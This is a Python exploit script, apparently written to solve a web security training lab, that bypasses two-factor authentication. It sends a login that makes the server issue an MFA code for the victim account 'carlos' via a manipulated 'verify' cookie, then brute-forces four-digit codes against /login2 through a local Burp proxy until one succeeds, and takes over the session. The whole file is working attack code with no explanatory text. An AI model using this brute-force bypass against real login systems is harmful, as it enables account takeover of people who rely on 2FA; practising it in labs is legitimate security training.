import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def generate_mfa(s, url, path, username, password, verify_cookie):
    target_url = url + path
    cookies = { 'verify': verify_cookie }
    payload = {
        'username': username,
        'password': password,
    }
    r = s.post(target_url, data=payload, cookies=cookies, allow_redirects=False)
    
    if r.status_code == 302:
        print(f'[+] Generated mfa-code for {verify_cookie}')
    else:
        print(f'[-] Failed generate mfa for {verify_cookie}')
        sys.exit(-1)

def bruteforce_mfa(s, url, path):
    target_url = url + path
    for num in range(1, 2000):
        mfa_code = str(num)
        while len(mfa_code) < 4:
            mfa_code = '0' + mfa_code

        payload = { 'mfa-code': mfa_code }
        cookies = { 'verify': 'carlos' }
        r = s.post(target_url, data=payload, cookies=cookies, allow_redirects=False)
        print(mfa_code, r.status_code)

        if r.status_code == 302:
            print(f'[+] Found mfa-code = {mfa_code}')
            return mfa_code
    print('[-] Not found mfa-code')
    sys.exit(-1)

def login_acc_via_mfa(s, url, path, mfa_code, verify_cookie):
    target_url = url + path
    payload = { 'mfa-code': mfa_code }
    cookies = { 'verify': verify_cookie }
    r = s.post(target_url, data=payload, cookies=cookies)
   
    if 'Log out' in r.text and r.status_code == 200:
        print('[+] Successful bypass 2FA')
    else:
        print('[-] Failed to bypass 2FA')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1].rstrip('/')

    username = 'wiener'
    password = 'peter'
    target_username = 'carlos'

    generate_mfa(s, url, '/login', username, password, target_username)
    mfa_code = bruteforce_mfa(s, url, '/login2')
    login_acc_via_mfa(s, url, '/login2', mfa_code, target_username)

    check_solved_lab(s, url)

if __name__ == '__main__':
    main()